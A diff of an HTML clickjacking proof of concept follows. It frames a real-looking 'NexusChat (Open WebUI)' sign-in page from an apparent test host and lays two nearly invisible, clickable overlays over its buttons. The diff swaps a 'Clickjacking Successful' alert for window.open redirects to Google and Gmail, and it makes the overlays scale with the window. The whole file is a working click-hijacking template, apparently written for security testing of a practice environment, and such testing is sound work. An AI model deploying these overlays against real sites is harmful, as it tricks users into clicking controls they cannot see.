@@ -1,41 +1,69 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Sign in to NexusChat (Open WebUI)</title> <!-- Looks same -->
+    <title>Sign in to NexusChat (Open WebUI)</title>
     <style>
         body {
             text-align: center;
             font-family: Arial, sans-serif;
             background-color: #fff;
+            margin: 0;
+            padding: 0;
+            overflow: hidden;
         }
         .overlay {
             position: absolute;
-            top: 420px;  /* adjusted to align */
-            left: 470px; /* adjusted to align */
-            width: 410px;
-            height: 55px;
+            top: 55.2%;
+            left: 33.5%;
+            width: 32%;
+            height: 7%;
             border-radius: 30px;
-            background: rgba(255, 255,0, 0.01); /* temporary to see */
+            background: rgba(255, 255, 0, 0.01);
             z-index: 99;
             cursor: pointer;
         }
+        .overlay:hover {
+            background: rgba(255, 255, 0, 0.05); /* debug only */
+        }
+
+        .overlay2 {  /* second overlay */
+            position: absolute;
+            top: 65%;   /* little below */
+            left: 33.5%;
+            width: 32%;
+            height: 7%;
+            border-radius: 30px;
+            background: rgba(255, 0, 0, 0.01);
+            z-index: 99;
+            cursor: pointer;
+        }
+        .overlay2:hover {
+            background: rgba(255, 0, 0, 0.05); /* debug only */
+        }
+
         iframe {
             position: absolute;
             top: 0;
             left: 0;
             width: 100%;
             height: 100%;
-            opacity: 1; /* Fully visible real page */
+            opacity: 1;
             border: none;
             z-index: 1;
         }
     </style>
 </head>
 <body>
-    <h1 style="visibility:hidden;">Fake Header - Invisible</h1> <!-- Invisible but for structure -->
-    <div class="overlay" onclick="alert('Clickjacking Successful! You clicked real MS Button without knowing')">
-        <!-- Hidden Click Layer -->
+    <h1 style="visibility:hidden;">Fake Header - Invisible</h1>
+
+    <!-- First overlay -->
+    <div class="overlay" onclick="window.open('https://www.google.com','_blank')">
     </div>
+
+    <!-- Second overlay -->
+    <div class="overlay2" onclick="window.open('https://www.gmail.com','_blank')">
+    </div>
+
     <iframe src="https://nexuschat-uat.cloud-practice.tech/auth"></iframe>
 </body>
 </html>
